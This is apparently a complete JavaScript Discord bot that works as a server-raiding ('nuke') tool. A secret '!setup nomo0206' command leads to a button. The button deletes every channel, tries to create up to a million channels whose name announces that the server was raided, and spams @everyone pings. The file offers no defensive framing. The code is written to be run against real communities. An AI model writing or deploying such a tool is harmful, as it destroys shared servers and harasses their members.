import express from "express";
import { 
  Client, 
  GatewayIntentBits, 
  Partials,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  ChannelType
} from "discord.js";

const TOKEN = process.env.TOKEN;

// ====== ダミーサーバー（Render用） ======
const app = express();
app.get("/", (req, res) => res.send("Bot is running"));
app.listen(3000, () => console.log("Dummy server running on port 3000"));

// ====== Discord Bot ======
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ],
  partials: [Partials.Channel]
});

client.once("ready", () => {
  console.log(`Logged in as ${client.user.tag}`);
});

// ====== 待機関数 ======
function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ====== メッセージコマンド "!setup nomo0206" ======
client.on("messageCreate", async (message) => {
  if (message.author.bot) return;

  const prefix = "!";
  if (!message.content.startsWith(prefix)) return;

  const args = message.content.slice(prefix.length).trim().split(" ");
  const command = args.shift().toLowerCase();

  if (command === "setup") {
    const secretCode = "nomo0206";

    if (args[0] !== secretCode) return;

    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId("server_reset_confirm")
        .setLabel("はい")
        .setStyle(ButtonStyle.Danger)
    );

    await message.reply({
      content: "サーバーを初期化しますか？\nこの操作は取り消せません。",
      components: [row],
      ephemeral: true
    });
  }
});

// ====== ボタン処理 ======
client.on("interactionCreate", async (interaction) => {
  if (!interaction.isButton()) return;

  if (interaction.customId === "server_reset_confirm") {
    await interaction.reply({
      content: "サーバーをリセットしています…",
      ephemeral: true
    });

    const guild = interaction.guild;

    // 1. 全チャンネル削除
    for (const [id, channel] of guild.channels.cache) {
      try {
        await channel.delete();
      } catch (err) {
        console.error(`削除失敗: ${channel.name}`, err);
      }
    }

    // ★ 最速モード（0秒）
    const createIntervalMs = 0;

    // 2. 新チャンネル作成
    const channelName =
      "このサーバーはむあによって荒らされました！破壊！";

    const newChannels = [];
    for (let i = 0; i < 1000000; i++) {
      const ch = await guild.channels.create({
        name: channelName,
        type: ChannelType.GuildText
      });

      newChannels.push(ch);

      // ★ 最速（0ms）
      await wait(createIntervalMs);
    }

    // 3. メッセージ送信
    for (const ch of newChannels) {
      await ch.send("@everyone");
      await ch.send(
        "このサーバーはむあによって荒らされました！"
      );
    }
  }
});

client.login(TOKEN);